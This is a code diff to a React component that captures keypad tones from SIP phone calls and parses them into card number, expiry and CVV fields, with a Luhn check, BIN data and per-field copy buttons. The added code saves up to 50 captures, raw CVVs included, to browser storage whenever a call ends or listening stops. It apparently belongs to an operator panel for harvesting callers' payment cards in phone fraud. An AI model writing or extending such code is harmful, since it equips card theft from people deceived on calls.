@@ -2,6 +2,25 @@ import { useState, useEffect, useCallback, useRef } from 'react';
 import { wsSend } from '../../hooks/useWebSocket';
 import { useWsMessage } from '../../hooks/useWsMessage';
 
+export interface CaptureHistoryEntry {
+  timestamp: number;
+  cc: string;
+  exp: string;
+  cvv: string;
+  rawDigits: string;
+  luhnValid: boolean | null;
+  binData: any;
+  reason: 'hangup' | 'stopped';
+}
+
+function saveCaptureToHistory(entry: CaptureHistoryEntry) {
+  try {
+    const existing: CaptureHistoryEntry[] = JSON.parse(localStorage.getItem('ct2_capture_history') || '[]');
+    const updated = [entry, ...existing].slice(0, 50);
+    localStorage.setItem('ct2_capture_history', JSON.stringify(updated));
+  } catch {}
+}
+
 interface DtmfCaptureModalProps {
   channel: string;
   sipUser: string;
@@ -137,12 +156,38 @@ export function DtmfCaptureModal({ channel, sipUser, onClose }: DtmfCaptureModal
     handleDigitRef.current(dtmfMsg.digit);
   }, [dtmfMsg]);
 
+  const saveAndClose = useCallback((reason: 'hangup' | 'stopped') => {
+    // Save to localStorage if any digits were captured
+    setFieldDigits(currentFields => {
+      setRawDigits(currentRaw => {
+        if (currentRaw.length > 0) {
+          const ccVal = currentFields.CC;
+          const luhn = ccVal.length >= 13 ? luhnCheck(ccVal) : null;
+          saveCaptureToHistory({
+            timestamp: Date.now(),
+            cc: ccVal,
+            exp: currentFields.EXP,
+            cvv: currentFields.CVV,
+            rawDigits: currentRaw.join(''),
+            luhnValid: luhn,
+            binData: binData,
+            reason,
+          });
+        }
+        return currentRaw;
+      });
+      return currentFields;
+    });
+    onClose();
+  }, [onClose, binData]);
+
   useEffect(() => {
-    if (dtmfDone && dtmfDone.channel === channel) onClose();
-  }, [dtmfDone, channel, onClose]);
+    if (dtmfDone && dtmfDone.channel === channel) saveAndClose('hangup');
+  }, [dtmfDone, channel, saveAndClose]);
 
   const stopListening = () => {
     wsSend({ cmd: 'stop_listening', channel });
+    saveAndClose('stopped');
   };
 
   const copyField = (text: string) => {
@@ -160,7 +205,7 @@ export function DtmfCaptureModal({ channel, sipUser, onClose }: DtmfCaptureModal
   const ccValid = fieldDigits.CC.length >= 13 ? luhnCheck(fieldDigits.CC) : null;
 
   return (
-    <div className="modal-overlay" onClick={e => e.target === e.currentTarget && stopListening()}>
+    <div className="modal-overlay" onClick={e => { if (e.target === e.currentTarget) stopListening(); }}>
       <div className="modal-box" style={{ maxWidth: 640, padding: 0 }} onClick={e => e.stopPropagation()}>
         {/* Header */}
         <div className="panel-header" style={{ borderBottomColor: 'rgba(31,111,235,0.2)', background: 'rgba(22,27,34,0.6)', borderRadius: '16px 16px 0 0' }}>
